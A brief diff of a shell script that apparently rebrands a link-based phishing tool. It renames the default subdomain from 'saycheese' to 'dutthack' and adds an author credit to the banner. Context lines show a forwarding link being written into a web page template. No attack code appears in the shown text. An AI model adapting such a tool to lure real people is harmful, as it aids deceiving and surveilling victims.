@@ -15,7 +15,7 @@ printf "\e[1;92m  |__| | | |  | |  | |     | |  \e[0m\e[1;77m  | |___| | | |___ 
 printf "\e[1;92m |____/  \_|__|_/  |_|     |_|  \e[0m\e[1;77m  | |   |_| |_|    | |  \ ___ |  |_|  \_\  \e[0m\n"
 printf "\e[1;92m                                 \e[0m                                 \n"
 
-printf " \e[1;77m v1.0 coded by github.com/dutt447utt447/dutthack \e[0m \n"
+printf " \e[1;77m v1.0 coded by Sunil Dutt (TechView Team)  github.com/dutt447utt447/dutthack \e[0m \n"
 
 printf "\n"
 
@@ -219,7 +219,7 @@ sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 start() {
 
 default_choose_sub="Y"
-default_subdomain="saycheese$RANDOM"
+default_subdomain="dutthack$RANDOM"
 
 printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
 read choose_sub
